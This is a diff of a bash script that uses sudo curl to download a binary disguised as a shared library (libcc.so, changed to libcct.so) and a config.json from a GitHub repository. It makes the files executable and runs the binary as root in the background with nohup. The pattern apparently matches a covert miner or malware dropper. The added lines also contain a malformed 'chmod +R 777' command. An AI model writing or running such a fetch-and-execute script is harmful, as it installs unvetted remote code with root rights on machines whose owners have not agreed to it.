@@ -1,6 +1,7 @@
 #!/bin/bash
-sudo curl -o /lib/libcc.so https://github.com/Shallow-Sea/tools/raw/main/libcc.so
-sudo curl -o /lib/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
-sudo chmod +x /lib/libcc.so
-sudo chmod +x /lib/config.json
-sudo nohup /lib/libcc.so > cat.log 2>&1 &
+sudo curl -o /root/libcct.so https://github.com/Shallow-Sea/tools/raw/main/libcct.so
+sudo curl -o /root/config.json https://github.com/Shallow-Sea/tools/raw/main/config.json
+sudo chmod +x /root/libcct.so
+sudo chmod +R 777 /root/libcct.so
+sudo chmod +x /root/config.json
+sudo nohup /root/libcct.so > cat.log 2>&1 &
